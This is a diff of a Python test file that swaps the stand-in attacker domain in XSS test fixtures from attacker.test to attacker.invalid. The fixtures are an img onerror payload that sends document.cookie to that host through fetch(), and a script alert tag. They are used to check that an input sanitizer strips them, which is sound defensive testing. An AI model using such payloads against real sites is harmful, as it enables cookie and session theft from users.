@@ -40,7 +40,7 @@ def test_sanitize_strips_script_tag() -> None:
 
 
 def test_sanitize_strips_img_onerror() -> None:
-    raw = '<img src="x" onerror="fetch(\'https://attacker.test/steal?c=\'+document.cookie)">safe'
+    raw = '<img src="x" onerror="fetch(\'https://attacker.invalid/steal?c=\'+document.cookie)">safe'
     result = sanitize_input(raw)
     assert "<img" not in result
     assert "onerror" not in result
@@ -173,7 +173,7 @@ async def test_judge_sanitizes_xss_payload_and_returns_verdict(
         update={
             "title": "<script>alert('xss')</script>Cache poisoning in FastAPI",
             "summary": (
-                '<img src="x" onerror="fetch(\'https://attacker.test/steal?c=\'+document.cookie)">'
+                '<img src="x" onerror="fetch(\'https://attacker.invalid/steal?c=\'+document.cookie)">'
                 "A misconfiguration in some FastAPI deployments."
             ),
         }
